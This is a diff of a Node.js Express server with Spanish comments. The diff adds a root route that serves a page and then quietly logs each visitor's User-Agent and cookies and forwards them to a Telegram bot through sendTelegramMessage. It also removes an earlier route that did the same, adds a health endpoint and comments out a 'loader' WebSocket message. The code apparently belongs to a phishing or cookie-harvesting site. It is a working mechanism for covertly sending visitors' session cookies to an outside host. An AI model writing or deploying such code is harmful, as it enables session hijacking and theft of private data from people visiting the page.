@@ -50,20 +50,29 @@ app.get("/check", (req, res) => {
     res.json({ pagina: "loader" });
 });
 
-// 🏠 Ruta principal
-app.get("/home.html", (req, res) => {
-    const userAgent = req.headers["user-agent"];
-    const cookies = req.cookies;
-    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
+// Endpoint de salud
+app.get("/health", (req, res) => {
+    res.status(200).send("OK");
+})
 
-    sendTelegramMessage(`Nuevo visitante:\nUser-Agent: ${userAgent}\nCookies: ${JSON.stringify(cookies)}`);
-    res.sendFile(path.join(__dirname, "public", "home.html"));
+
+// 🏠 Ruta principal (cuando un usuario entra a la página)
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "index.html"));
+
+    setTimeout(() => {
+        const userAgent = req.headers["user-agent"];
+        const cookies = req.cookies;
+        console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
+        sendTelegramMessage(userAgent, cookies);
+    })
+
 });
 
 // 🔌 WebSockets para actualización en tiempo real
 wss.on("connection", (ws) => {
     console.log("🔌 Cliente WebSocket conectado");
-    ws.send("loader");
+    // ws.send("loader");
 
     ws.on("close", () => {
         console.log("🔌 Cliente WebSocket desconectado");
